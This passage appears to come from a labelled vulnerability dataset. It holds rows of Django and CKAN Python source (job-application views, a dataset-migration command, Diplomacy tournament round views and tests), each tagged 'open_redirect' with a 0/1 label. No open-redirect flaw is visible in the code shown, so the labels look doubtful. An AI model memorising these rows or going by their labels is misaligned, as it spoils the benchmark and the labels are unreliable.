        # User wants to upload applications for a position
        elif request.POST.get(""upload-applications""):
            upload_applications(request)
            return position(request, Position.objects.get(
                id=request.POST.get(""id"")))
    # Persists positions sorting
    request.session['position_sort'] = sort_by
    # Displays list of positions
    return render(request, 'positions.html', positions_list_data(request, sort_by))


# Data and visible text to render with positions
def position_detail_data(request, position):
    return {'baseVisibleText': InterfaceText, 'applicationsForm': ImportApplicationsForm, 'positionText': PositionText, 'userVisibleText': PositionsViewText, 'position': position}


# Position detail view
@login_required(login_url='/login/', redirect_field_name=None)
def position(request, position):
    return render(request, 'position.html', position_detail_data(request, position))


def upload_applications(request):
    position = Position.objects.get(
        id=request.POST.get(""id""))
    # form = ImportApplicationsForm(request.POST, request.FILES)
    # applications = import_applications(request)
    # position.applications.add(applications)
    # position.save()


def import_applications(request):
    if request.method == 'POST':
        form = ImportApplicationsForm(request.POST, request.FILES)
        if form.is_valid():
            breakpoint()
            parse_applications()
            # Call application parser logic here##

            return render(request, 'importapplications/applications.html', {
                'form': form})

    form = ImportApplicationsForm()
    return render(request, 'importapplications/applications.html', {
        'form': form})
/n/n/n",1,open_redirect
4,160,84cadcdc2efe01e2ced1b3901ebbdbba6de5e592,"ckanext/data_qld/commands.py/n/nimport ckan.model as model
import ckan.plugins.toolkit as toolkit
import sqlalchemy
from ckan.lib.cli import CkanCommand
from ckan.model.package import Package
from ckanapi import LocalCKAN
import ckan.logic as logic
ValidationError = logic.ValidationError

_and_ = sqlalchemy.and_


class MigrateExtras(CkanCommand):
    """"""Migrates legacy field values that were added as free extras to datasets to their schema counterparts.
    """"""

    summary = __doc__.split('\n')[0]

    def __init__(self, name):

        super(MigrateExtras, self).__init__(name)

    def get_package_ids(self):
        session = model.Session
        package_ids = []

        packages = (
            session.query(
                Package
            )
        )

        for pkg in packages:
            package_ids.append(pkg.id)

        return package_ids

    def update_package(self, package_id, security_classification, data_driven_application, version, author_email, notes, update_frequency, resources):
        # https://github.com/ckan/ckanext-scheming/issues/158
        destination = LocalCKAN()
        destination.action.package_patch(id=package_id,
                                         security_classification=security_classification,
                                         data_driven_application=data_driven_application,
                                         version=version,
                                         author_email=author_email,
                                         notes=notes,
                                         update_frequency=update_frequency,
                                         resources=resources)

    def command(self):
        """"""

        :return:
        """"""
        self._load_config()

        context = {'session': model.Session}

        # Step 1: Get all the package IDs.
        package_ids = self.get_package_ids()

        for package_id in package_ids:
            # Set some defaults
            default_security_classification = ""PUBLIC""
            default_data_driven_application = ""NO""
            default_version = ""1.0""
            default_author_email = ""opendata@qld.gov.au""
            default_update_frequency = ""annually""
            default_size = '1'  # 1 Byte
            resources = []

            pkg = toolkit.get_action('package_show')(context, {
                'id': package_id
            })

            if pkg['resources']:
                size = default_size

                for resource in pkg['resources']:
                    if 'size' in resource:
                        size = resource['size'] if resource['size'] is not None and resource[
                            'size'] != '0 bytes' else default_size

                    if 'name' in resource:
                        name = resource['name']

                    if 'description' in resource:
                        description = resource['description'] or name

                    update_resource = {
                        ""id"": resource['id'],
                        ""size"": size,
                        ""name"": name,
                        ""description"": description,
                        ""url"": resource['url']
                    }
                    resources.append(update_resource)

            # Go through the packages and check for presence of 'Security classification'
            # and 'Used in data-driven application' extras
            security_classification = default_security_classification
            data_driven_application = default_data_driven_application
            version = default_version
            author_email = default_author_email
            update_frequency = default_update_frequency

            if pkg.get('extras', None):

                for extra in pkg['extras']:
                    if extra['key'] == 'Security classification':
                        security_classification = extra['value'] or default_security_classification
                    elif extra['key'] in ['Used in data-driven application']:
                        data_driven_application = extra['value'] or default_data_driven_application

            if 'version' in pkg:
                version = pkg['version'] or default_version

            if 'author_email' in pkg:
                author_email = pkg['author_email'] or default_author_email

            if 'notes' in pkg:
                notes = pkg['notes'] or pkg['title']

            if 'update_frequency' in pkg:
                update_frequency = pkg['update_frequency'] or default_update_frequency

            try:
                self.update_package(package_id, security_classification, data_driven_application, version, author_email, notes, update_frequency, resources)
            except ValidationError as e:
                print ('Package Failed: ', package_id, '\n', e.error_dict, )
                print ('Package Payload: ', package_id, security_classification, data_driven_application, version, author_email, notes, update_frequency, resources)

        return 'SUCCESS'


class DemotePublishers(CkanCommand):
    """"""Demotes any existing 'publisher-*' users from admin to editor in their respective organisations
    """"""

    summary = __doc__.split('\n')[0]

    def __init__(self, name):

        super(DemotePublishers, self).__init__(name)
        self.parser.add_option('-u', '--username_prefix', dest='username_prefix', help='Only demote usernames starting with this prefix', type=str, default='publisher-')

    def get_organizations(self):
        return toolkit.get_action('organization_list')(data_dict={'all_fields': True, 'include_users': True})

    def patch_organisation_users(self, org_id, users):
        toolkit.get_action('organization_patch')(data_dict={'id': org_id, 'users': users})

    def command(self):
        """"""

        :return:
        """"""
        self._load_config()

        username_prefix = self.options.username_prefix

        updates = 0

        for org in self.get_organizations():
            print('- - - - - - - - - - - - - - - - - - - - - - - - -')
            updates_required = False
            users = org.get('users', [])
            print('Processing organisation ID: %s | Name: %s' % (org['id'], org['name']))
            if users:
                for user in org['users']:
                    if user['name'].startswith(username_prefix) and user['capacity'] == 'admin':
                        print('- Setting capacity for user %s to ""editor"" in organisation %s' % (user['name'], org['name']))
                        user['capacity'] = 'editor'
                        updates_required = True
                        updates += 1
                if updates_required:
                    print('- Updating user capacities for organisation %s' % org['name'])
                    self.patch_organisation_users(org['id'], users)
                else:
                    print('- Nothing to update for organisation %s' % org['name'])

        print('- - - - - - - - - - - - - - - - - - - - - - - - -')

        return ""COMPLETED. Total updates %s\n"" % updates
/n/n/n",0,open_redirect
5,161,84cadcdc2efe01e2ced1b3901ebbdbba6de5e592,"/ckanext/data_qld/commands.py/n/nimport ckan.model as model
import ckan.plugins.toolkit as toolkit
import sqlalchemy
from ckan.lib.cli import CkanCommand
from ckan.model.package import Package
from ckanapi import LocalCKAN

_and_ = sqlalchemy.and_


class MigrateExtras(CkanCommand):
    """"""Migrates legacy field values that were added as free extras to datasets to their schema counterparts.
    """"""

    summary = __doc__.split('\n')[0]

    def __init__(self, name):

        super(MigrateExtras, self).__init__(name)

    def get_package_ids(self):
        session = model.Session
        package_ids = []

        packages = (
            session.query(
                Package
            )
        )

        for pkg in packages:
            package_ids.append(pkg.id)

        return package_ids

    def update_package(self, package_id, security_classification, data_driven_application, version, author_email, notes, update_frequency, resources):
        # https://github.com/ckan/ckanext-scheming/issues/158
        destination = LocalCKAN()
        destination.action.package_patch(id=package_id,
                                         security_classification=security_classification,
                                         data_driven_application=data_driven_application,
                                         version=version,
                                         author_email=author_email,
                                         notes=notes,
                                         update_frequency=update_frequency,
                                         resources=resources)

    def command(self):
        """"""

        :return:
        """"""
        self._load_config()

        context = {'session': model.Session}

        # Step 1: Get all the package IDs.
        package_ids = self.get_package_ids()

        for package_id in package_ids:
            # Set some defaults
            default_security_classification = ""PUBLIC""
            default_data_driven_application = ""NO""
            default_version = ""1.0""
            default_author_email = ""opendata@qld.gov.au""
            default_update_frequency = ""annually""
            default_size = '1'  # 1 Byte
            resources = []

            pkg = toolkit.get_action('package_show')(context, {
                'id': package_id
            })

            if pkg['resources']:
                size = default_size

                for resource in pkg['resources']:
                    if 'size' in resource:
                        size = resource['size'] if resource['size'] is not None and resource[
                            'size'] != '0 bytes' else default_size

                    if 'name' in resource:
                        name = resource['name']

                    if 'description' in resource:
                        description = resource['description'] or name

                    update_resource = {
                        ""id"": resource['id'],
                        ""size"": size,
                        ""name"": name,
                        ""description"": description
                    }
                    resources.append(update_resource)

            # Go through the packages and check for presence of 'Security classification'
            # and 'Used in data-driven application' extras
            security_classification = default_security_classification
            data_driven_application = default_data_driven_application
            version = default_version
            author_email = default_author_email
            update_frequency = default_update_frequency

            if pkg.get('extras', None):

                for extra in pkg['extras']:
                    if extra['key'] == 'Security classification':
                        security_classification = extra['value'] or default_security_classification
                    elif extra['key'] in ['Used in data-driven application']:
                        data_driven_application = extra['value'] or default_data_driven_application

            if 'version' in pkg:
                version = pkg['version'] or default_version

            if 'author_email' in pkg:
                author_email = pkg['author_email'] or default_author_email

            if 'notes' in pkg:
                notes = pkg['notes'] or pkg['title']

            if 'update_frequency' in pkg:
                update_frequency = pkg['update_frequency'] or default_update_frequency

            self.update_package(package_id, security_classification, data_driven_application, version, author_email, notes, update_frequency, resources)

        return 'SUCCESS'


class DemotePublishers(CkanCommand):
    """"""Demotes any existing 'publisher-*' users from admin to editor in their respective organisations
    """"""

    summary = __doc__.split('\n')[0]

    def __init__(self, name):

        super(DemotePublishers, self).__init__(name)
        self.parser.add_option('-u', '--username_prefix', dest='username_prefix', help='Only demote usernames starting with this prefix', type=str, default='publisher-')

    def get_organizations(self):
        return toolkit.get_action('organization_list')(data_dict={'all_fields': True, 'include_users': True})

    def patch_organisation_users(self, org_id, users):
        toolkit.get_action('organization_patch')(data_dict={'id': org_id, 'users': users})

    def command(self):
        """"""

        :return:
        """"""
        self._load_config()

        username_prefix = self.options.username_prefix

        updates = 0

        for org in self.get_organizations():
            print('- - - - - - - - - - - - - - - - - - - - - - - - -')
            updates_required = False
            users = org.get('users', [])
            print('Processing organisation ID: %s | Name: %s' % (org['id'], org['name']))
            if users:
                for user in org['users']:
                    if user['name'].startswith(username_prefix) and user['capacity'] == 'admin':
                        print('- Setting capacity for user %s to ""editor"" in organisation %s' % (user['name'], org['name']))
                        user['capacity'] = 'editor'
                        updates_required = True
                        updates += 1
                if updates_required:
                    print('- Updating user capacities for organisation %s' % org['name'])
                    self.patch_organisation_users(org['id'], users)
                else:
                    print('- Nothing to update for organisation %s' % org['name'])

        print('- - - - - - - - - - - - - - - - - - - - - - - - -')

        return ""COMPLETED. Total updates %s\n"" % updates
/n/n/n",1,open_redirect
6,46,1ac934531ba0a3f16aee86e3b36a912dc8b67821,"visualiser/tournament/round_views.py/n/n# Diplomacy Tournament Visualiser
# Copyright (C) 2014, 2016-2019 Chris Brand
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

""""""
Round Views for the Diplomacy Tournament Visualiser.
""""""

from django.contrib.auth.decorators import permission_required
from django.core.exceptions import ValidationError
from django.db.models import Sum
from django.forms.formsets import formset_factory
from django.http import Http404, HttpResponseRedirect
from django.shortcuts import render
from django.urls import reverse
from django.utils.translation import ugettext as _

from tournament.forms import BaseGamePlayersFormset
from tournament.forms import BasePlayerRoundFormset
from tournament.forms import BasePowerAssignFormset
from tournament.forms import GamePlayersForm
from tournament.forms import GameScoreForm
from tournament.forms import GetSevenPlayersForm
from tournament.forms import PlayerRoundForm
from tournament.forms import PowerAssignForm

from tournament.tournament_views import get_modifiable_tournament_or_404
from tournament.tournament_views import get_visible_tournament_or_404

from tournament.diplomacy import GreatPower, GameSet
from tournament.email import send_board_call
from tournament.game_seeder import GameSeeder
from tournament.models import Tournament, Round, Game
from tournament.models import TournamentPlayer, RoundPlayer, GamePlayer

# Round views

def get_round_or_404(tournament, round_num):
    """"""Return the specified numbered round of the specified tournament or raise Http404.""""""
    try:
        return tournament.round_numbered(round_num)
    except Round.DoesNotExist:
        raise Http404

def round_simple(request, tournament_id, round_num, template):
    """"""Just render the specified template with the round""""""
    t = get_visible_tournament_or_404(tournament_id, request.user)
    r = get_round_or_404(t, round_num)
    context = {'tournament': t, 'round': r}
    return render(request, 'rounds/%s.html' % template, context)

@permission_required('tournament.add_roundplayer')
def roll_call(request, tournament_id, round_num=None):
    """"""Provide a form to specify which players are playing each round""""""
    t = get_modifiable_tournament_or_404(tournament_id, request.user)
    PlayerRoundFormset = formset_factory(PlayerRoundForm,
                                         extra=2,
                                         formset=BasePlayerRoundFormset)
    if round_num:
        r = get_round_or_404(t, round_num)
        round_set = t.round_set.filter(pk=r.pk)
    else:
        round_set = t.round_set.all()
    data = []
    # Go through each player in the Tournament
    for tp in t.tournamentplayer_set.all():
        current = {'player': tp.player}
        rps = tp.roundplayers()
        # And each round of the Tournament
        for r in round_set:
            # Is this player listed as playing this round ?
            played = rps.filter(the_round=r).exists()
            current['round_%d' % r.number()] = played
        data.append(current)
    if round_num:
        formset = PlayerRoundFormset(request.POST or None,
                                     tournament=t,
                                     round_num=int(round_num),
                                     initial=data)
    else:
        formset = PlayerRoundFormset(request.POST or None,
                                     tournament=t,
                                     initial=data)
    if formset.is_valid():
        for form in formset:
            try:
                p = form.cleaned_data['player']
            except KeyError:
                # This must be one of the extra forms, still empty
                continue
            # Ensure that this Player is in the Tournament
            i, created = TournamentPlayer.objects.get_or_create(player=p,
                                                                tournament=t)
            try:
                i.full_clean()
            except ValidationError as e:
                form.add_error(form.fields['player'], e)
                i.delete()
                return render(request,
                              'tournaments/round_players.html',
                              {'title': _('Roll Call'),
                               'tournament': t,
                               'post_url': reverse('roll_call', args=(tournament_id,)),
                               'formset' : formset})
            if created:
                i.save()
            for r_name, value in form.cleaned_data.items():
                if r_name == 'player':
                    # This column is just for the user
                    continue
                # Extract the round number from the field name
                i = int(r_name[6:])
                # Find that Round
                r = t.round_numbered(i)
                # Ignore non-bool fields and ones that aren't True
                if value is True:
                    # Ensure that we have a corresponding RoundPlayer
                    i, created = RoundPlayer.objects.get_or_create(player=p,
                                                                   the_round=r)
                    try:
                        i.full_clean()
                    except ValidationError as e:
                        form.add_error(None, e)
                        i.delete()
                        return render(request,
                                      'tournaments/round_players.html',
                                      {'title': _('Roll Call'),
                                       'tournament': t,
                                       'post_url': reverse('roll_call', args=(tournament_id,)),
                                       'formset' : formset})
                    if created:
                        i.save()
                else:
                    # delete any corresponding RoundPlayer
                    # This could be a player who was previously checked-off in error
                    RoundPlayer.objects.filter(player=p,
                                               the_round=r).delete()
        r = t.current_round()
        # If we're doing a roll call for a single round,
        # we only want to seed boards if it's the current round
        if not round_num or (r.number() == round_num):
            if t.seed_games:
                # Seed the games. Note that this will redirect to 'get_seven"" if necessary
                return HttpResponseRedirect(reverse('seed_games',
                                                    args=(tournament_id,
                                                          r.number())))
            else:
                # Next job is almost certainly to create the actual games
                return HttpResponseRedirect(reverse('create_games',
                                                    args=(tournament_id,
                                                          r.number())))

    return render(request,
                  'tournaments/round_players.html',
                  {'title': _('Roll Call'),
                   'tournament': t,
                   'post_url': reverse('roll_call', args=(tournament_id,)),
                   'formset' : formset})

@permission_required('tournament.add_game')
def get_seven(request, tournament_id, round_num):
    """"""Provide a form to get a multiple of seven players for a round""""""
    t = get_modifiable_tournament_or_404(tournament_id, request.user)
    r = get_round_or_404(t, round_num)
    count = r.roundplayer_set.count()
    sitters = count % 7
    # If we already have an exact multiple of seven players, go straight to creating games
    if sitters == 0:
        return HttpResponseRedirect(reverse('seed_games',
                                            args=(tournament_id,
                                                  round_num)))

    doubles = 7 - sitters
    context = {'tournament': t,
               'round': r,
               'count' : count,
               'sitters' : sitters,
               'doubles' : doubles}
    form = GetSevenPlayersForm(request.POST or None,
                               the_round=r)
    if form.is_valid():
        # Update RoundPlayers to indicate number of games they're playing
        # First clear any old game_counts
        for rp in r.roundplayer_set.exclude(game_count=1):
            rp.game_count = 1
            rp.save()
        for i in range(sitters):
            rp = form.cleaned_data['sitter_%d' % i]
            if rp:
                rp.game_count = 0
                rp.save()
        for i in range(doubles):
            rp = form.cleaned_data['double_%d' % i]
            if rp:
                rp.game_count = 2
                rp.save()
        return HttpResponseRedirect(reverse('seed_games',
                                            args=(tournament_id,
                                                  round_num)))
    context['form'] = form
    return render(request,
                  'rounds/get_seven.html',
                  context)

def _sitters_and_two_gamers(tournament, the_round):
    """""" Return a (sitters, two_gamers) 2-tuple""""""
    tourney_players = tournament.tournamentplayer_set.all()
    round_players = the_round.roundplayer_set.all()
    # Get the set of players that haven't already been assigned to games for this round
    rps = []
    sitters = set()
    two_gamers = set()
    for rp in round_players:
        assert rp.gameplayers().count() == 0, ""%d games already exist for %s in this round"" % (rp.gameplayers().count(),
                                                                                               str(rp))
        rps.append(rp)
        if rp.game_count == 1:
            continue
        elif rp.game_count == 0:
            # This player is sitting out this round
            sitters.add(rp.tournamentplayer())
        elif rp.game_count == 2:
            # This player is playing two games this round
            two_gamers.add(rp.tournamentplayer())
        else:
            assert 0, 'Unexpected game_count value %d for %s' % (rp.game_count, str(rp))
    assert (not sitters) or (not two_gamers)
    if sitters:
        # Check that we have the right number of players sitting out
        assert (len(rps) - len(sitters)) % 7 == 0
    if two_gamers:
        # Check that we have the right number of players playing two games
        assert (len(rps) + len(two_gamers)) % 7 == 0
    # We also need to flag any players who aren't present for this round as sitting out
    for tp in tourney_players:
        if not round_players.filter(player=tp.player).exists():
            sitters.add(tp)
    return sitters, two_gamers

def _create_game_seeder(tournament, round_number):
    """"""Return a GameSeeder that knows about the tournament so far""""""
    tourney_players = tournament.tournamentplayer_set.all()
    # Create the game seeder
    seeder = GameSeeder(GreatPower.objects.all(),
                        starts=100,
                        iterations=10)
    # Tell the seeder about every player in the tournament
    # (regardless of whether they're playing this round - they may have played already)
    for tp in tourney_players:
        seeder.add_player(tp)
    # Provide details of games already played this tournament
    for n in range(1, round_number):
        rnd = tournament.round_numbered(n)
        for g in rnd.game_set.all():
            game = set()
            for gp in g.gameplayer_set.all():
                game.add((gp.tournamentplayer(), gp.power))
            # TODO This doesn't deal with replacement players
            assert len(game) == 7
            seeder.add_played_game(game)
    # Add in any biases now that all players have been added
    for tp in tourney_players:
        # Just use seederbias_set so we only get each SeederBias once
        # because we only look at their player1
        for sb in tp.seederbias_set.all():
            seeder.add_bias(sb.player1, sb.player2, sb.weight)
    return seeder

def _seed_games(tournament, the_round):
    """"""Wrapper round GameSeeder to do the actual seeding for a round""""""
    seeder = _create_game_seeder(tournament, the_round.number())
    sitters, two_gamers = _sitters_and_two_gamers(tournament, the_round)
    # Generate the games
    return seeder.seed_games(omitting_players=sitters,
                             players_doubling_up=two_gamers)

def _seed_games_and_powers(tournament, the_round):
    """"""Wrapper round GameSeeder to do the actual seeding for a round""""""
    seeder = _create_game_seeder(tournament, the_round.number())
    sitters, two_gamers = _sitters_and_two_gamers(tournament, the_round)
    # Generate the games
    return seeder.seed_games_and_powers(omitting_players=sitters,
                                        players_doubling_up=two_gamers)

@permission_required('tournament.add_game')
def seed_games(request, tournament_id, round_num):
    """"""Seed players to the games for a round""""""
    t = get_modifiable_tournament_or_404(tournament_id, request.user)
    r = get_round_or_404(t, round_num)
    if request.method == 'POST':
        PowerAssignFormset = formset_factory(PowerAssignForm,
                                             formset=BasePowerAssignFormset,
                                             extra=0)
        formset = PowerAssignFormset(request.POST, the_round=r)
        if formset.is_valid():
            for f in formset:
                # Update the game
                g = f.game
                g.name = f.cleaned_data['game_name']
                g.the_set = f.cleaned_data['the_set']
                try:
                    g.full_clean()
                except ValidationError as e:
                    f.add_error(None, e)
                    return render(request,
                                  'rounds/seeded_games.html',
                                  {'tournament': t,
                                   'round': r,
                                   'formset' : formset})
                g.save()
                # Assign the powers to the players
                for gp_id, field in f.cleaned_data.items():
                    if gp_id in ['the_set', 'game_name']:
                        continue
                    gp = GamePlayer.objects.get(id=gp_id)
                    gp.power = field
                    try:
                        gp.full_clean()
                    except ValidationError as e:
                        f.add_error(None, e)
                        return render(request,
                                      'rounds/seeded_games.html',
                                      {'tournament': t,
                                       'round': r,
                                       'formset' : formset})
                    gp.save()
            # Notify the players
            send_board_call(r)
            # Redirect to the index of games in the round
            return HttpResponseRedirect(reverse('game_index',
                                                args=(tournament_id, round_num)))
    else:
        # Check for a multiple of seven players,
        # allowing for players sitting out or playing multiple games
        player_count = r.roundplayer_set.aggregate(Sum('game_count'))['game_count__sum']
        if (player_count % 7) != 0:
            # We need players to sit out or play multiple games
            return HttpResponseRedirect(reverse('get_seven',
                                                args=(tournament_id,
                                                      r.number())))
        # Delete any existing Games and GamePlayers for this round
        r.game_set.all().delete()
        # TODO It's a bit hokey to have a fixed default GameSet here
        default_set = GameSet.objects.get(pk=1)
        data = []
        # Generate a seeding, and assign powers if required
        if t.power_assignment == Tournament.AUTO:
            games = _seed_games_and_powers(t, r)
            # Add the Games and GamePlayers to the database
            for i, g in enumerate(games, start=1):
                new_game = Game.objects.create(name='R%sG%d' % (round_num, i),
                                               the_round=r,
                                               the_set=default_set)
                current = {'game_name': new_game.name,
                           'the_set': new_game.the_set}
                for tp, power in g:
                    gp = GamePlayer.objects.create(player=tp.player,
                                                   game=new_game,
                                                   power=power)
                    current[gp.id] = power
                data.append(current)
        else:
            games = _seed_games(t, r)
            # Add the Games and GamePlayers to the database
            for i, g in enumerate(games, start=1):
                new_game = Game.objects.create(name='R%sG%d' % (round_num, i),
                                               the_round=r,
                                               the_set=default_set)
                current = {'game_name': new_game.name,
                           'the_set': new_game.the_set}
                for tp in g:
                    gp = GamePlayer.objects.create(player=tp.player,
                                                   game=new_game)
                # If we're assigning powers from preferences, do so now
                if t.power_assignment == Tournament.PREFERENCES:
                    new_game.assign_powers_from_prefs()
                for tp in g:
                    gp = GamePlayer.objects.get(player=tp.player,
                                                game=new_game)
                    current[gp.id] = gp.power
                data.append(current)
        # Create a form for each of the resulting games
        PowerAssignFormset = formset_factory(PowerAssignForm,
                                             formset=BasePowerAssignFormset,
                                             extra=0)
        formset = PowerAssignFormset(the_round=r, initial=data)
    # Note that we wait for confirmation before adding them to the database
    context = {'tournament': t, 'round': r, 'games': games, 'formset': formset}
    return render(request, 'rounds/seeded_games.html', context)

@permission_required('tournament.add_game')
def create_games(request, tournament_id, round_num):
    """"""Provide a form to create the games for a round""""""
    t = get_modifiable_tournament_or_404(tournament_id, request.user)
    r = get_round_or_404(t, round_num)
    # Do any games already exist for the round ?
    games = r.game_set.all()
    data = []
    for g in games:
        current = {'game_name': g.name,
                   'the_set': g.the_set}
        for gp in g.gameplayer_set.all():
            current[gp.power.name] = gp.roundplayer()
        data.append(current)
    # Estimate the number of games for the round
    round_players = r.roundplayer_set.count()
    expected_games = (round_players + 6) // 7
    # This can happen if there are no RoundPlayers for this round
    if expected_games < 1:
        expected_games = 1
    GamePlayersFormset = formset_factory(GamePlayersForm,
                                         extra=expected_games - games.count(),
                                         formset=BaseGamePlayersFormset)
    formset = GamePlayersFormset(request.POST or None,
                                 the_round=r,
                                 initial=data)
    if formset.is_valid():
        for f in formset:
            # Update/create the game
            try:
                g, created = Game.objects.get_or_create(name=f.cleaned_data['game_name'],
                                                        the_round=r,
                                                        the_set=f.cleaned_data['the_set'])
            except KeyError:
                # This must be an extra, unused formset
                continue
            try:
                g.full_clean()
            except ValidationError as e:
                f.add_error(None, e)
                g.delete()
                return render(request,
                              'rounds/create_games.html',
                              {'tournament': t,
                               'round': r,
                               'formset' : formset})
            if created:
                g.save()
            # Assign the players to the game
            for power, field in f.cleaned_data.items():
                try:
                    p = GreatPower.objects.get(name=power)
                except GreatPower.DoesNotExist:
                    continue
                # Is there already a player for this power in this game ?
                try:
                    i = GamePlayer.objects.get(game=g,
                                               power=p)
                except GamePlayer.DoesNotExist:
                    # Create one (default first_season and first_year)
                    i = GamePlayer(player=field.player, game=g, power=p)
                else:
                    # Change the player (if necessary)
                    i.player = field.player
                try:
                    i.full_clean()
                except ValidationError as e:
                    f.add_error(None, e)
                    # TODO Not 100% certain that this is the right thing to do here
                    i.delete()
                    return render(request,
                                  'rounds/create_games.html',
                                  {'tournament': t,
                                   'round': r,
                                   'formset' : formset})
                i.save()
        # Notify the players
        send_board_call(r)
        # Redirect to the index of games in the round
        return HttpResponseRedirect(reverse('game_index',
                                            args=(tournament_id, round_num)))

    return render(request,
                  'rounds/create_games.html',
                  {'tournament': t,
                   'round': r,
                   'formset' : formset})

@permission_required('tournament.change_gameplayer')
def game_scores(request, tournament_id, round_num):
    """"""Provide a form to enter scores for all the games in a round""""""
    t = get_modifiable_tournament_or_404(tournament_id, request.user)
    r = get_round_or_404(t, round_num)
    GameScoreFormset = formset_factory(GameScoreForm,
                                       extra=0)
    # Initial data
    data = []
    the_list = r.game_set.all()
    for game in the_list:
        content = {'game_name': game.name}
        for gp in game.gameplayer_set.all():
            content[gp.power.name] = gp.score
        data.append(content)
    formset = GameScoreFormset(request.POST or None, initial=data)
    if formset.is_valid():
        for f in formset:
            # Find the game
            g = Game.objects.get(name=f.cleaned_data['game_name'],
                                 the_round=r)
            # Set the score for each player
            for power, field in f.cleaned_data.items():
                # Ignore non-GreatPower fields (game_name)
                try:
                    p = GreatPower.objects.get(name=power)
                except GreatPower.DoesNotExist:
                    continue
                # Find the matching GamePlayer
                # TODO This will fail if there was a replacement
                i = GamePlayer.objects.get(game=g,
                                           power=p)
                # Set the score
                i.score = field
                try:
                    i.full_clean()
                except ValidationError as e:
                    f.add_error(None, e)
                    return render(request,
                                  'rounds/game_score.html',
                                  {'tournament': t,
                                   'round': round_num,
                                   'formset' : formset})
                i.save()
        # Redirect to the round index
        return HttpResponseRedirect(reverse('round_index',
                                            args=(tournament_id)))

    return render(request,
                  'rounds/game_score.html',
                  {'tournament': t,
                   'round': round_num,
                   'formset' : formset})

def game_index(request, tournament_id, round_num):
    """"""Display a list of games in the round""""""
    t = get_visible_tournament_or_404(tournament_id, request.user)
    r = get_round_or_404(t, round_num)
    the_list = r.game_set.all()
    context = {'round': r, 'game_list': the_list}
    return render(request, 'games/index.html', context)
/n/n/nvisualiser/tournament/test_round_views.py/n/n# Diplomacy Tournament Visualiser
# Copyright (C) 2019 Chris Brand
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

from django.contrib.auth.models import Permission, User
from django.test import TestCase
from django.urls import reverse
from django.utils import timezone

from tournament.game_scoring import G_SCORING_SYSTEMS
from tournament.models import Tournament, TournamentPlayer
from tournament.models import Round, RoundPlayer
from tournament.models import R_SCORING_SYSTEMS, T_SCORING_SYSTEMS
from tournament.players import Player

class RoundViewTests(TestCase):
    fixtures = ['game_sets.json']

    @classmethod
    def setUpTestData(cls):
        # A superuser
        cls.USERNAME1 = 'superuser'
        cls.PWORD1 = 'l33tPw0rd'
        u1 = User.objects.create_user(username=cls.USERNAME1,
                                      password=cls.PWORD1,
                                      is_superuser=True)
        u1.save()

        # Some Players
        p1 = Player.objects.create(first_name='Angela',
                                   last_name='Ampersand')
        p2 = Player.objects.create(first_name='Bobby',
                                   last_name='Bandersnatch')
        p3 = Player.objects.create(first_name='Cassandra',
                                   last_name='Cucumber')
        p4 = Player.objects.create(first_name='Derek',
                                   last_name='Dromedary')
        p5 = Player.objects.create(first_name='Ethel',
                                   last_name='Elephant')
        p6 = Player.objects.create(first_name='Frank',
                                   last_name='Frankfurter')
        p7 = Player.objects.create(first_name='Georgette',
                                   last_name='Grape')
        p8 = Player.objects.create(first_name='Harry',
                                   last_name='Heffalump')
        p9 = Player.objects.create(first_name='Iris',
                                   last_name='Ignoramus')
        p10 = Player.objects.create(first_name='Jake',
                                    last_name='Jalopy')
        p11 = Player.objects.create(first_name='Katrina',
                                    last_name='Kingpin')
        p12 = Player.objects.create(first_name='Lucas',
                                    last_name='Lemon')
        p13 = Player.objects.create(first_name='Margaret',
                                    last_name='Maleficent')

        now = timezone.now()
        # Published Tournament so it's visible to all
        cls.t = Tournament.objects.create(name='t1',
                                          start_date=now,
                                          end_date=now,
                                          round_scoring_system=R_SCORING_SYSTEMS[0].name,
                                          tournament_scoring_system=T_SCORING_SYSTEMS[0].name,
                                          draw_secrecy=Tournament.SECRET,
                                          is_published=True)
        cls.r1 = Round.objects.create(tournament=cls.t,
                                      scoring_system=G_SCORING_SYSTEMS[0].name,
                                      dias=True,
                                      start=cls.t.start_date)
        # Add TournamentPlayers
        tp = TournamentPlayer.objects.create(player=p1,
                                             tournament=cls.t)
        tp = TournamentPlayer.objects.create(player=p2,
                                             tournament=cls.t)
        tp = TournamentPlayer.objects.create(player=p3,
                                             tournament=cls.t)
        tp = TournamentPlayer.objects.create(player=p4,
                                             tournament=cls.t)
        tp = TournamentPlayer.objects.create(player=p5,
                                             tournament=cls.t)
        tp = TournamentPlayer.objects.create(player=p6,
                                             tournament=cls.t)
        tp = TournamentPlayer.objects.create(player=p7,
                                             tournament=cls.t)
        tp = TournamentPlayer.objects.create(player=p8,
                                             tournament=cls.t)
        tp = TournamentPlayer.objects.create(player=p9,
                                             tournament=cls.t)
        tp = TournamentPlayer.objects.create(player=p10,
                                             tournament=cls.t)
        tp = TournamentPlayer.objects.create(player=p11,
                                             tournament=cls.t)
        tp = TournamentPlayer.objects.create(player=p12,
                                             tournament=cls.t)
        tp = TournamentPlayer.objects.create(player=p13,
                                             tournament=cls.t)
        # And RoundPlayers
        RoundPlayer.objects.create(player=p1, the_round=cls.r1)
        RoundPlayer.objects.create(player=p2, the_round=cls.r1)
        RoundPlayer.objects.create(player=p3, the_round=cls.r1)
        RoundPlayer.objects.create(player=p4, the_round=cls.r1)
        RoundPlayer.objects.create(player=p5, the_round=cls.r1)
        RoundPlayer.objects.create(player=p6, the_round=cls.r1)
        RoundPlayer.objects.create(player=p7, the_round=cls.r1)
        RoundPlayer.objects.create(player=p8, the_round=cls.r1)
        RoundPlayer.objects.create(player=p9, the_round=cls.r1)
        RoundPlayer.objects.create(player=p10, the_round=cls.r1)
        RoundPlayer.objects.create(player=p11, the_round=cls.r1)
        RoundPlayer.objects.create(player=p12, the_round=cls.r1)
